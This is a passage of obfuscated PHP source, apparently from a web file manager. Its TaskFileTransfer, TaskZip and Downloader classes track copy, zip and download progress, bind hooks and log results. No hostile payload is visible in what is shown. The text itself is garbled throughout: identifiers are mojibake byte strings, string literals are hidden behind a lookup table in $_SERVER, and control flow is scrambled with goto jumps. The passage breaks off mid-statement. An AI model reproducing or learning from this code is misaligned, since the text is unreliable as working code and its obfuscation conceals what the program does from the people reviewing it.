$D—∞Ò»”Ñô; goto f˜Í¬π–ﬂÚ; eﬁÖÖ “åá: $A°èﬁÙÛçŸ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A°Î˜±Áÿä = array($A°èﬁÙÛçŸ[29] => $A°èﬁÙÛçŸ[1370]); if ($céﬂ”‡È“—) { $A°Î˜±Áÿä[$A°èﬁÙÛçŸ[1349]] = $céﬂ”‡È“—; } goto bèáß‘‰Öè; bèáß‘‰Öè: $D—∞Ò»”Ñô = Model($A°èﬁÙÛçŸ[395])->where($A°Î˜±Áÿä)->select(); $D—∞Ò»”Ñô = $D—∞Ò»”Ñô ? $D—∞Ò»”Ñô : array(); foreach ($D—∞Ò»”Ñô as $CÕë∞´ÇÆŒ => $C…ÖÒ¿ÏÇî) { $D—∞Ò»”Ñô[$CÕë∞´ÇÆŒ] = json_decode($C…ÖÒ¿ÏÇî[$A°èﬁÙÛçŸ[354]], !0); } goto Bâë €‰πò; f˜Í¬π–ﬂÚ: } public static function valueSet($DÜÕÉΩîÂç, $CôÇ£ëÙÛ·) { goto aÙ·∞ïÌ©’; aÙ·∞ïÌ©’: $dê©öú∏¨à =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$CôÇ£ëÙÛ·) { return Model($dê©öú∏¨à[395])->where(array($dê©öú∏¨à[90] => $DÜÕÉΩîÂç, $dê©öú∏¨à[29] => $dê©öú∏¨à[1370]))->delete(); } $D†ùÎ≥ç › = json_encode($CôÇ£ëÙÛ·); goto EÆ≤ä˜êŒ±; DüÜ©“…÷Ñ: Model($dê©öú∏¨à[395])->add($Bé≠ºì©‘Õ, array(), !0); goto d…ƒìÚÁúπ; EÆ≤ä˜êŒ±: if (!$D†ùÎ≥ç ›) { ob_start(); var_dump($CôÇ£ëÙÛ·); $bÈƒÚ®¯‹„ = ob_get_clean(); self::log($dê©öú∏¨à[1371] . json_encode_force($bÈƒÚ®¯‹„)); } if (!$DÜÕÉΩîÂç || !$CôÇ£ëÙÛ·[$dê©öú∏¨à[364]]) { return !1; } $Bé≠ºì©‘Õ = array($dê©öú∏¨à[29] => $dê©öú∏¨à[1370], $dê©öú∏¨à[1349] => USER_ID, $dê©öú∏¨à[90] => $DÜÕÉΩîÂç, $dê©öú∏¨à[354] => $D†ùÎ≥ç ›); goto DüÜ©“…÷Ñ; d…ƒìÚÁúπ: } public static function log($a»èﬁ∆çÔ∞) { write_log($a»èﬁ∆çÔ∞, $_SERVER[£¿ÌÙëü¡¯¯][1372]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto aœ´É∂éùı; eãÜêëñª´: Hook::bind($dŸ´ºèºÍÂ[531], array($this, $dŸ´ºèºÍÂ[1379])); Hook::bind($dŸ´ºèºÍÂ[532], array($this, $dŸ´ºèºÍÂ[1380])); Hook::bind($dŸ´ºèºÍÂ[534], array($this, $dŸ´ºèºÍÂ[1381])); goto dõ©úä»∏∂; dõ©úä»∏∂: Hook::bind($dŸ´ºèºÍÂ[535], array($this, $dŸ´ºèºÍÂ[1381])); Hook::bind($dŸ´ºèºÍÂ[501], array($this, $dŸ´ºèºÍÂ[1382])); Hook::bind($dŸ´ºèºÍÂ[498], array($this, $dŸ´ºèºÍÂ[1382])); goto FáëãÔ“◊Ú; dﬁ≥á¡Ÿ‹´: $f‘®ó–éâ∞[$dŸ´ºèºÍÂ[1294]] = $dŸ´ºèºÍÂ[33]; $f‘®ó–éâ∞[$dŸ´ºèºÍÂ[1396]] = $dŸ´ºèºÍÂ[33]; $f‘®ó–éâ∞[$dŸ´ºèºÍÂ[1397]] = 0; goto F√ΩÁÁ…Î¿; F√ΩÁÁ…Î¿: if (!$f‘®ó–éâ∞[$dŸ´ºèºÍÂ[1248]]) { $f‘®ó–éâ∞[$dŸ´ºèºÍÂ[1248]] = LNG($dŸ´ºèºÍÂ[1398]); } goto fﬁÕÌ±ƒÇ; d‚´à‹∫£Ü: Hook::bind($dŸ´ºèºÍÂ[1386], array($this, $dŸ´ºèºÍÂ[1387])); Hook::bind($dŸ´ºèºÍÂ[1388], array($this, $dŸ´ºèºÍÂ[1389])); Hook::bind($dŸ´ºèºÍÂ[1390], array($this, $dŸ´ºèºÍÂ[1391])); goto C¢πêï’ÔÀ; D√ûÛÂë∆Í: Hook::bind($dŸ´ºèºÍÂ[1383], array($this, $dŸ´ºèºÍÂ[1384])); Hook::bind($dŸ´ºèºÍÂ[524], array($this, $dŸ´ºèºÍÂ[1385])); $this->sourceModelCopyFlag = !1; goto d‚´à‹∫£Ü; aœ´É∂éùı: $dŸ´ºèºÍÂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $f‘®ó–éâ∞ =& $this->task; $this->sourceCopyFolder = !1; goto D∑ŸØçÆ≈ÿ; FáëãÔ“◊Ú: Hook::bind($dŸ´ºèºÍÂ[503], array($this, $dŸ´ºèºÍÂ[1382])); Hook::bind($dŸ´ºèºÍÂ[505], array($this, $dŸ´ºèºÍÂ[1382])); Hook::bind($dŸ´ºèºÍÂ[507], array($this, $dŸ´ºèºÍÂ[1382])); goto D√ûÛÂë∆Í; D∑ŸØçÆ≈ÿ: Hook::bind($dŸ´ºèºÍÂ[1373], array($this, $dŸ´ºèºÍÂ[1374])); Hook::bind($dŸ´ºèºÍÂ[1375], array($this, $dŸ´ºèºÍÂ[1376])); Hook::bind($dŸ´ºèºÍÂ[1377], array($this, $dŸ´ºèºÍÂ[1378])); goto eãÜêëñª´; C¢πêï’ÔÀ: $f‘®ó–éâ∞[$dŸ´ºèºÍÂ[1392]] = LNG($dŸ´ºèºÍÂ[1393]); $f‘®ó–éâ∞[$dŸ´ºèºÍÂ[1394]] = 0; $f‘®ó–éâ∞[$dŸ´ºèºÍÂ[1395]] = 0; goto dﬁ≥á¡Ÿ‹´; fﬁÕÌ±ƒÇ: } protected function endAfter() { goto fÂ†Üéöäí; fÂ†Üéöäí: $E∏©üÀï•â =& $_SERVER[£¿ÌÙëü¡¯¯]; Hook::unbind($E∏©üÀï•â[1373], array($this, $E∏©üÀï•â[1374])); Hook::unbind($E∏©üÀï•â[1375], array($this, $E∏©üÀï•â[1376])); goto bŒ¬¥í÷¿; a·®“æ‚≤ù: Hook::unbind($E∏©üÀï•â[498], array($this, $E∏©üÀï•â[1382])); Hook::unbind($E∏©üÀï•â[503], array($this, $E∏©üÀï•â[1382])); Hook::unbind($E∏©üÀï•â[505], array($this, $E∏©üÀï•â[1382])); goto EÆÇß∞Úà√; eÉÚ–üÇ°æ: Hook::unbind($E∏©üÀï•â[534], array($this, $E∏©üÀï•â[1381])); Hook::unbind($E∏©üÀï•â[535], array($this, $E∏©üÀï•â[1381])); Hook::unbind($E∏©üÀï•â[501], array($this, $E∏©üÀï•â[1382])); goto a·®“æ‚≤ù; AÂïõïúŒ†: Hook::unbind($E∏©üÀï•â[1386], array($this, $E∏©üÀï•â[1387])); Hook::unbind($E∏©üÀï•â[1388], array($this, $E∏©üÀï•â[1389])); Hook::unbind($E∏©üÀï•â[1390], array($this, $E∏©üÀï•â[1391])); goto Bõ”Ôˆ¯•¬; bŒ¬¥í÷¿: Hook::unbind($E∏©üÀï•â[1377], array($this, $E∏©üÀï•â[1378])); Hook::unbind($E∏©üÀï•â[531], array($this, $E∏©üÀï•â[1379])); Hook::unbind($E∏©üÀï•â[532], array($this, $E∏©üÀï•â[1380])); goto eÉÚ–üÇ°æ; EÆÇß∞Úà√: Hook::unbind($E∏©üÀï•â[507], array($this, $E∏©üÀï•â[1382])); Hook::unbind($E∏©üÀï•â[1383], array($this, $E∏©üÀï•â[1384])); Hook::unbind($E∏©üÀï•â[524], array($this, $E∏©üÀï•â[1385])); goto AÂïõïúŒ†; Bõ”Ôˆ¯•¬: } public function copyMoveStart($Aæ±üÑ£˜¥, $Aˆ¿‹™πÎ’, $FêÓê˘≠†∞, $EØˆã∑úæÆ) { } public function updateAfter() { goto EäóÌ’ƒÍ”; FèÇú‹ÒÆÚ: if ($this->sourceModelCopyFlag) { return; } $a€äœ≥ÜÜÂ = 0; if ($FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1396]] == $dﬁ≠Í∞†€˘[1015]) { $a€äœ≥ÜÜÂ = $FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1395]] * 0.5; } else { if ($FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1396]] == $dﬁ≠Í∞†€˘[92]) { $a€äœ≥ÜÜÂ = $FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1395]] * 0.5 + $FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1394]] * 0.5; } } goto eÑÜ⁄≤≈ÆÜ; eÑÜ⁄≤≈ÆÜ: $FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1350]] = ($FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1399]] + $a€äœ≥ÜÜÂ) / $FÍè¬øø‚”[$dﬁ≠Í∞†€˘[685]]; if ($FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1350]] > 0) { $DØããØáüÂ = timeFloat() - $FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1352]] - $FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1355]]; $FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1356]] = $DØããØáüÂ * (1 - $FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1350]]) / $FÍè¬øø‚”[$dﬁ≠Í∞†€˘[1350]]; } goto cÍÿ£∑…‰≥; EäóÌ’ƒÍ”: $dﬁ≠Í∞†€˘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÍè¬øø‚” =& $this->task; if (!$FÍè¬øø‚”[$dﬁ≠Í∞†€˘[685]]) { return; } goto FèÇú‹ÒÆÚ; cÍÿ£∑…‰≥: } public function addPath($A¯á‰ÎãÂ–) { goto B“Ú¬àÊ´Á; cË¬≥•¥ Æ: if ($d‰¨ö¶ÚÇã[$f±º›ª¥®ò[29]] == $f±º›ª¥®ò[164]) { $c¯ÙﬂïÿΩè[$f±º›ª¥®ò[1292]] += 1; } else { $c¯ÙﬂïÿΩè[$f±º›ª¥®ò[1292]] += $d‰¨ö¶ÚÇã[$f±º›ª¥®ò[81]][$f±º›ª¥®ò[79]]; if ($d‰¨ö¶ÚÇã[$f±º›ª¥®ò[366]]) { $c¯ÙﬂïÿΩè[$f±º›ª¥®ò[1292]] += $d‰¨ö¶ÚÇã[$f±º›ª¥®ò[81]][$f±º›ª¥®ò[80]] + 1; } } $c¯ÙﬂïÿΩè[$f±º›ª¥®ò[685]] += $d‰¨ö¶ÚÇã[$f±º›ª¥®ò[78]]; $this->update(); goto cÇ˜…‹æÿË; B“Ú¬àÊ´Á: $f±º›ª¥®ò =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$A¯á‰ÎãÂ–) { return; } $c¯ÙﬂïÿΩè =& $this->task; goto d‘äöË‚áÕ; d‘äöË‚áÕ: $d‰¨ö¶ÚÇã = IO::infoWithChildren($A¯á‰ÎãÂ–); $f©æÍö˜≈ú = $c¯ÙﬂïÿΩè[$f±º›ª¥®ò[1400]] ? $c¯ÙﬂïÿΩè[$f±º›ª¥®ò[1400]][$f±º›ª¥®ò[1401]] : 0; $c¯ÙﬂïÿΩè[$f±º›ª¥®ò[1400]] = array($f±º›ª¥®ò[1401] => $f©æÍö˜≈ú + 1, $f±º›ª¥®ò[383] => $d‰¨ö¶ÚÇã[$f±º›ª¥®ò[28]], $f±º›ª¥®ò[76] => $d‰¨ö¶ÚÇã[$f±º›ª¥®ò[76]], $f±º›ª¥®ò[462] => $d‰¨ö¶ÚÇã[$f±º›ª¥®ò[462]] ? $d‰¨ö¶ÚÇã[$f±º›ª¥®ò[462]] : $d‰¨ö¶ÚÇã[$f±º›ª¥®ò[76]]); goto cË¬≥•¥ Æ; cÇ˜…‹æÿË: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($eŸÊ‘ÃóÎÚ) { $EÔ§õàüﬂ◊ =& $_SERVER[£¿ÌÙëü¡¯¯]; $C“’ÔÉ‚õá =& $this->task; $C“’ÔÉ‚õá[$EÔ§õàüﬂ◊[1392]] = $eŸÊ‘ÃóÎÚ[$EÔ§õàüﬂ◊[28]]; $C“’ÔÉ‚õá[$EÔ§õàüﬂ◊[1294]] = $eŸÊ‘ÃóÎÚ[$EÔ§õàüﬂ◊[28]]; $this->update(); } public function copyFileStart($B‰˜ÿË≈ı≠, $cÉáÍ‹ç‘ÿ, $C‹ùÖ›ùèÂ, $dêüà™µà¬, $eÀ¶—åÁâ‚, $EôºÏß∞åÜ) { goto bê•–Óú≤õ; AÉøç¯ıÑû: $c‡óﬂ∂É´§[$Cóû£üÈÒ€[1294]] = $Cóû£üÈÒ€[33]; $c‡óﬂ∂É´§[$Cóû£üÈÒ€[1396]] = $Cóû£üÈÒ€[33]; $c‡óﬂ∂É´§[$Cóû£üÈÒ€[1397]] = 0; goto Bø∆¯á∆‚ü; Bø∆¯á∆‚ü: $this->update(); goto F±ÒÕ™£∂¶; bê•–Óú≤õ: $Cóû£üÈÒ€ =& $_SERVER[£¿ÌÙëü¡¯¯]; $b∫Ú¿‘ÃÍ§ = $eÀ¶—åÁâ‚; if ($b∫Ú¿‘ÃÍ§ == $GLOBALS[$Cóû£üÈÒ€[1402]]) { $b∫Ú¿‘ÃÍ§ = $GLOBALS[$Cóû£üÈÒ€[1403]]; } goto fãæ’Ñ‚åû; fãæ’Ñ‚åû: $GLOBALS[$Cóû£üÈÒ€[1403]] = $eÀ¶—åÁâ‚; $GLOBALS[$Cóû£üÈÒ€[1402]] = $EôºÏß∞åÜ; $c‡óﬂ∂É´§ =& $this->task; goto cƒÂõ®ØáÏ; cƒÂõ®ØáÏ: $c‡óﬂ∂É´§[$Cóû£üÈÒ€[1392]] = $b∫Ú¿‘ÃÍ§; $c‡óﬂ∂É´§[$Cóû£üÈÒ€[1394]] = (int) $B‰˜ÿË≈ı≠->size($cÉáÍ‹ç‘ÿ); $c‡óﬂ∂É´§[$Cóû£üÈÒ€[1395]] = 0; goto AÉøç¯ıÑû; F±ÒÕ™£∂¶: } public function copyFileEnd($Aµª≤ÜÈŸ…, $AÉåù’ËŒı, $D“¥Á¯ß€Œ, $A–Ïàµíµ∂, $a–∑ãä÷›õ, $D›™æãﬂ§Ω) { $e∞é«áºåÉ =& $_SERVER[£¿ÌÙëü¡¯¯]; $c†≈ÍÜã’„ =& $this->task; $c†≈ÍÜã’„[$e∞é«áºåÉ[1395]] = $c†≈ÍÜã’„[$e∞é«áºåÉ[1394]]; $c†≈ÍÜã’„[$e∞é«áºåÉ[1396]] = $e∞é«áºåÉ[33]; if ($a–∑ãä÷›õ == $c†≈ÍÜã’„[$e∞é«áºåÉ[1392]]) { $c†≈ÍÜã’„[$e∞é«áºåÉ[1399]] += $c†≈ÍÜã’„[$e∞é«áºåÉ[1394]]; $this->update(1); } else { $this->update(); $c†≈ÍÜã’„[$e∞é«áºåÉ[1395]] = 0; } self::log($e∞é«áºåÉ[1404] . $AÉåù’ËŒı . $e∞é«áºåÉ[67] . $A–Ïàµíµ∂ . $e∞é«áºåÉ[214] . $a–∑ãä÷›õ . $e∞é«áºåÉ[1405] . $c†≈ÍÜã’„[$e∞é«áºåÉ[1392]]); } public function updateFileEnd($E§âãÛÁ¨–, $f´°Ωéœ“Ê) { $A÷‰·±õå´ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B∫Ü†æœ†∂ =& $this->task; $B∫Ü†æœ†∂[$A÷‰·±õå´[1392]] = $E§âãÛÁ¨–; $B∫Ü†æœ†∂[$A÷‰·±õå´[1394]] = $f´°Ωéœ“Ê; $B∫Ü†æœ†∂[$A÷‰·±õå´[1399]] += $f´°Ωéœ“Ê; $this->update(1); } public function sourceModelCopy($d¡åıàêøÙ) { goto b≥öﬂΩﬁîÇ; Cíó◊¯Æúö: switch ($CÎ ÖÏ»àñ) { case $CîüÆ¬‹ã®[499]: $f¡˘€»≠°’ = 1; break; case $CîüÆ¬‹ã®[502]: $aÖÑåö≈•ï[$CîüÆ¬‹ã®[1392]] = $f¨í¨É˘≈Ì[$CîüÆ¬‹ã®[28]]; break; case $CîüÆ¬‹ã®[504]: $f¡˘€»≠°’ = intval($d¡åıàêøÙ[$CîüÆ¬‹ã®[360]] * 0.4); break; case $CîüÆ¬‹ã®[506]: $f¡˘€»≠°’ = intval($d¡åıàêøÙ[$CîüÆ¬‹ã®[360]] * 0.2); break; case $CîüÆ¬‹ã®[508]: $f¡˘€»≠°’ = intval($d¡åıàêøÙ[$CîüÆ¬‹ã®[360]] * 0.4); break; } $this->update($f¡˘€»≠°’); $this->sourceModelCopyFlag = !1; goto e«≠Îá…ΩŸ; b≥öﬂΩﬁîÇ: $CîüÆ¬‹ã® =& $_SERVER[£¿ÌÙëü¡¯¯]; $CÎ ÖÏ»àñ = $d¡åıàêøÙ[0]; $f¨í¨É˘≈Ì = $d¡åıàêøÙ[1]; goto e≠‚Ò◊ü’˜; e≠‚Ò◊ü’˜: $aÖÑåö≈•ï =& $this->task; $this->sourceModelCopyFlag = !0; $f¡˘€»≠°’ = 0; goto Cíó◊¯Æúö; e«≠Îá…ΩŸ: } public function sourceRemove($eÚ¥´Áø∂ù, $B∑ÃÿÌŒª±) { $Bºÿºöü∏ê =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->sourceModelCopyFlag = !0; $cçëÖØñ∂≈ = 1; if (isset($eÚ¥´Áø∂ù[$Bºÿºöü∏ê[81]])) { $cçëÖØñ∂≈ = $eÚ¥´Áø∂ù[$Bºÿºöü∏ê[81]][$Bºÿºöü∏ê[79]] + $eÚ¥´Áø∂ù[$Bºÿºöü∏ê[81]][$Bºÿºöü∏ê[80]] + 1; } $this->update($cçëÖØñ∂≈); $this->sourceModelCopyFlag = !1; } public function sourceMove($E¿âè¿◊ëâ) { $this->sourceRemove($E¿âè¿◊ëâ, !1); } public function curlProgress($fË÷‡¨æõå, $dŸ∂¨Ï§˘÷, $A‰ë≈≠¥“…, $F°Ë≈ıÕ¬ˆ, $f≠¥·ƒ‡•ù) { $fåèÏº£∂˘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $D√“ÓıŒô  =& $this->task; if ($f≠¥·ƒ‡•ù > 0) { $D√“ÓıŒô [$fåèÏº£∂˘[1294]] = $fåèÏº£∂˘[1406]; $D√“ÓıŒô [$fåèÏº£∂˘[1396]] = $fåèÏº£∂˘[92]; if ($D√“ÓıŒô [$fåèÏº£∂˘[1394]] == $F°Ë≈ıÕ¬ˆ || $F°Ë≈ıÕ¬ˆ > 1024 * 1024) { $D√“ÓıŒô [$fåèÏº£∂˘[1395]] = $f≠¥·ƒ‡•ù; } if ($D√“ÓıŒô [$fåèÏº£∂˘[1397]]) { $D√“ÓıŒô [$fåèÏº£∂˘[1395]] = $f≠¥·ƒ‡•ù + $D√“ÓıŒô [$fåèÏº£∂˘[1397]]; } } else { if ($A‰ë≈≠¥“… > 0) { if ($D√“ÓıŒô [$fåèÏº£∂˘[1394]] == $dŸ∂¨Ï§˘÷) { $D√“ÓıŒô [$fåèÏº£∂˘[1395]] = $A‰ë≈≠¥“…; $D√“ÓıŒô [$fåèÏº£∂˘[1294]] = $fåèÏº£∂˘[1407]; $D√“ÓıŒô [$fåèÏº£∂˘[1396]] = $fåèÏº£∂˘[1015]; } } } $this->update(); } public function curlProgressStart($D·Æ™õï‘Œ) { } public function curlProgressEnd($D™È∫ÂëÉÛ) { $D“∑Ü√∂›÷ =& $_SERVER[£¿ÌÙëü¡¯¯]; $f ‚Ü¨ÉΩÈ =& $this->task; $Càﬂ¥ë ®£ = curl_getinfo($D™È∫ÂëÉÛ); $Aç≠Ü£‡≥· = $Càﬂ¥ë ®£[$D“∑Ü√∂›÷[1408]]; if ($f ‚Ü¨ÉΩÈ[$D“∑Ü√∂›÷[1396]] == $D“∑Ü√∂›÷[92] && $Aç≠Ü£‡≥·) { $f ‚Ü¨ÉΩÈ[$D“∑Ü√∂›÷[1397]] += $Aç≠Ü£‡≥·; } $this->update(); } } goto bÜ¨îÏ °Î; Dç¶êÜùâ◊: class TaskZip extends TaskFileTransfer { protected function startAfter() { $dœûËº§è“ =& $_SERVER[£¿ÌÙëü¡¯¯]; parent::startAfter(); Hook::bind($dœûËº§è“[1420], array($this, $dœûËº§è“[1415])); $D‚”Â»œöœ =& $this->task; $D‚”Â»œöœ[$dœûËº§è“[1417]] = $dœûËº§è“[1015]; if (!$D‚”Â»œöœ[$dœûËº§è“[1248]]) { $D‚”Â»œöœ[$dœûËº§è“[1248]] = LNG($dœûËº§è“[1421]); } } protected function endAfter() { $Eî≈Ö–•Ñµ =& $_SERVER[£¿ÌÙëü¡¯¯]; parent::endAfter(); Hook::unbind($Eî≈Ö–•Ñµ[1420], array($this, $Eî≈Ö–•Ñµ[1415])); } public function updateAfter() { $f“Ö–˜ƒ‹∫ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÿ˘‡Çë ¥ =& $this->task; if (!$bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1292]] || !$bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[685]]) { return; } if ($bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1417]] == $f“Ö–˜ƒ‹∫[1015]) { $d”Ò´Çêœâ = $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1395]]; if ($bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1396]] != $f“Ö–˜ƒ‹∫[1015]) { $d”Ò´Çêœâ = 0; } $A®≈πõ‘°å = ($bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1399]] + $d”Ò´Çêœâ) / $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[685]]; $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1350]] = $A®≈πõ‘°å * 0.3; } else { if ($bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1417]] == $f“Ö–˜ƒ‹∫[298]) { $A®≈πõ‘°å = $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1297]] / $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1292]]; $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1350]] = 0.3 + $A®≈πõ‘°å * 0.5; } else { if ($bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1417]] == $f“Ö–˜ƒ‹∫[92]) { $A®≈πõ‘°å = 0; if ($bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1394]]) { $A®≈πõ‘°å = $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1395]] / $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1394]]; } $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1350]] = 0.3 + 0.5 + $A®≈πõ‘°å * 0.2; } } } if ($bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1350]] > 0) { $A»ÓÍõØºﬁ = timeFloat() - $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1352]] - $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1355]]; $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1356]] = $A»ÓÍõØºﬁ * (1 - $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1350]]) / $bÿ˘‡Çë ¥[$f“Ö–˜ƒ‹∫[1350]]; } } public function copyFileStart($bç§–ÿêÉÌ, $fÏ ıóîºê, $cÊÛ°Ö•ﬂ§, $f´·À«¢œ◊, $dª…æãØå , $F‡∂´úä»ﬁ) { $eã∂πêâç´ =& $_SERVER[£¿ÌÙëü¡¯¯]; parent::copyFileStart($bç§–ÿêÉÌ, $fÏ ıóîºê, $cÊÛ°Ö•ﬂ§, $f´·À«¢œ◊, $dª…æãØå , $F‡∂´úä»ﬁ); $aﬂ”ÙÑÈë— =& $this->task; if ($aﬂ”ÙÑÈë—[$eã∂πêâç´[1417]] == $eã∂πêâç´[298]) { $aﬂ”ÙÑÈë—[$eã∂πêâç´[1417]] = $eã∂πêâç´[92]; } $this->update(); } public function copyFileEnd($Aí‰Ã‹›Ü£, $D‡æ¨–ÔÎå, $eÁ»Ù≥Úâœ, $fèıõŒŸÃﬁ, $DΩØàﬂœÍÉ, $c∫öß¨Øπú) { $Bòô∂ãÎ¬â =& $_SERVER[£¿ÌÙëü¡¯¯]; $f≠®ÌìΩç’ =& $this->task; $f≠®ÌìΩç’[$Bòô∂ãÎ¬â[1395]] = $f≠®ÌìΩç’[$Bòô∂ãÎ¬â[1394]]; $f≠®ÌìΩç’[$Bòô∂ãÎ¬â[1399]] += $f≠®ÌìΩç’[$Bòô∂ãÎ¬â[1394]]; $f≠®ÌìΩç’[$Bòô∂ãÎ¬â[1396]] = $Bòô∂ãÎ¬â[33]; $this->update(); } public function nameParse($BÉÖ§óŒ‡´) { $Dªã•èä≥Ü =& $_SERVER[£¿ÌÙëü¡¯¯]; $e≤îÇ‰©¨ =& $this->task; if ($e≤îÇ‰©¨[$Dªã•èä≥Ü[1297]] < $e≤îÇ‰©¨[$Dªã•èä≥Ü[1292]]) { $BëÙŒâ»ö° = get_path_this($BÉÖ§óŒ‡´); if (strstr($BëÙŒâ»ö°, $Dªã•èä≥Ü[94])) { $e≤îÇ‰©¨[$Dªã•èä≥Ü[1297]] += 1; } } if ($e≤îÇ‰©¨[$Dªã•èä≥Ü[1417]] == $Dªã•èä≥Ü[1015]) { $e≤îÇ‰©¨[$Dªã•èä≥Ü[1417]] = $Dªã•èä≥Ü[298]; } $e≤îÇ‰©¨[$Dªã•èä≥Ü[1392]] = $BÉÖ§óŒ‡´; $this->update(); } } class Downloader { static function start($D∑Úç¡—ØØ, $d≤‡âï’•Ü, $FÖ¬π™º‚ = 10) { goto e‘¬µﬁ§ñﬁ; cïÌÎ´ŸèÌ: $FΩ≥÷¥‘Ã§ = $d≤‡âï’•Ü . $Fﬁ•±“–ëÖ[1423]; if (is_array($D∑Úç¡—ØØ)) { $cØÔØÚù∂û = $D∑Úç¡—ØØ; } else { $cØÔØÚù∂û = url_header($D∑Úç¡—ØØ); } $D∑Úç¡—ØØ = $cØÔØÚù∂û[$Fﬁ•±“–ëÖ[292]]; goto dƒó¥∂≤ù∂; eÏÑªµÜ°Ö: $A≥üÎéÈ†∏ = intval($cØÔØÚù∂û[$Fﬁ•±“–ëÖ[322]]); if (file_exists($FΩ≥÷¥‘Ã§) && time() - filemtime($FΩ≥÷¥‘Ã§) < 3) { return array($Fﬁ•±“–ëÖ[1007] => !1, $Fﬁ•±“–ëÖ[1009] => $Fﬁ•±“–ëÖ[1424]); } $CÜÂÏé∑¡” = array(); goto fÿÜ¬ëõä«; D¯¯óÕú±›: if ($fí‚ä˘•º£[$Fﬁ•±“–ëÖ[1007]]) { @unlink($féÔâ¢‡∫⁄); } return $fí‚ä˘•º£; goto eƒñÌääóß; F‘„¶†Ó”Ï: if ($F∑óƒÑËÀ > $A≥üÎéÈ†∏) { @unlink($FΩ≥÷¥‘Ã§); } file_put_contents($féÔâ¢‡∫⁄, json_encode($CÜÂÏé∑¡”)); $fí‚ä˘•º£ = self::fileDownloadCurl($D∑Úç¡—ØØ, $d≤‡âï’•Ü, !0, $F∑óƒÑËÀ, $A≥üÎéÈ†∏); goto D¯¯óÕú±›; dƒó¥∂≤ù∂: if (!$D∑Úç¡—ØØ) { return array($Fﬁ•±“–ëÖ[1007] => !1, $Fﬁ•±“–ëÖ[1009] => $Fﬁ•±“–ëÖ[1012]); } if (!$cØÔØÚù∂û[$Fﬁ•±“–ëÖ[1208]] || $cØÔØÚù∂û[$Fﬁ•±“–ëÖ[322]] == 0) { @unlink($FΩ≥÷¥‘Ã§); @unlink($d≤‡âï’•Ü); $fí‚ä˘•º£ = self::fileDownloadFopen($D∑Úç¡—ØØ, $d≤‡âï’•Ü, $cØÔØÚù∂û[$Fﬁ•±“–ëÖ[322]]); if ($fí‚ä˘•º£[$Fﬁ•±“–ëÖ[1007]]) { return $fí‚ä˘•º£; } else { @unlink($FΩ≥÷¥‘Ã§); @unlink($d≤‡âï’•Ü); $fí‚ä˘•º£ = self::fileDownloadCurl($D∑Úç¡—ØØ, $d≤‡âï’•Ü, !1, 0, $cØÔØÚù∂û[$Fﬁ•±“–ëÖ[322]]); @unlink($FΩ≥÷¥‘Ã§); return $fí‚ä˘•º£; } } $F∑óƒÑËÀ = is_file($FΩ≥÷¥‘Ã§) ? filesize($FΩ≥÷¥‘Ã§) : 0; goto eÏÑªµÜ°Ö; fÿÜ¬ëõä«: if (is_file($féÔâ¢‡∫⁄)) { $föÂ‡„–µ» = file_get_contents($féÔâ¢‡∫⁄); $CÜÂÏé∑¡” = json_decode($föÂ‡„–µ», 1); } if (file_exists($d≤‡âï’•Ü) && $A≥üÎéÈ†∏ == filesize($d≤‡âï’•Ü)) { @unlink($FΩ≥÷¥‘Ã§); @unlink($féÔâ¢‡∫⁄); return array($Fﬁ•±“–ëÖ[1007] => !0, $Fﬁ•±“–ëÖ[1009] => $Fﬁ•±“–ëÖ[1425]); } if ($CÜÂÏé∑¡”[$Fﬁ•±“–ëÖ[322]] != $A≥üÎéÈ†∏) { $CÜÂÏé∑¡” = array($Fﬁ•±“–ëÖ[322] => $A≥üÎéÈ†∏); } goto F‘„¶†Ó”Ï; e‘¬µﬁ§ñﬁ: $Fﬁ•±“–ëÖ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!request_url_safe($D∑Úç¡—ØØ)) { return array($Fﬁ•±“–ëÖ[1007] => !1, $Fﬁ•±“–ëÖ[1009] => $Fﬁ•±“–ëÖ[1012]); } $féÔâ¢‡∫⁄ = 